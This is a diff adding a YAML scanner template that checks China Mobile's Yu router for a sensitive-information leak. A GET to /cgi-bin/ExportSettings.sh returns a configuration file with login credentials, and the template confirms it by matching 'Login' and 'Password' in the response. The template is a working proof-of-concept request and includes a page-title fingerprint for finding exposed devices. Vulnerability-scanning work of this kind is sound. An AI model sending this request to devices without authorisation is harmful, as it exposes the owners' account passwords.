@@ -1,0 +1,18 @@
+id: china-mobile-exportsettings-info-leak
+
+info:
+  name: 中国移动 禹路由 ExportSettings.sh 敏感信息泄露漏洞
+  author: jijue
+  severity: high
+  verified: true
+  description: |
+    中国移动 禹路由 ExportSettings.sh 存在敏感信息泄露漏洞，攻击者通过漏洞获取配置文件，其中包含账号密码等敏感信息
+    title="互联世界 物联未来-登录"
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/ExportSettings.sh
+    expression: response.status == 200 && response.body.bcontains(b'The following line') && response.body.bcontains(b'Login') && response.body.bcontains(b'Password')
+expression: r0()
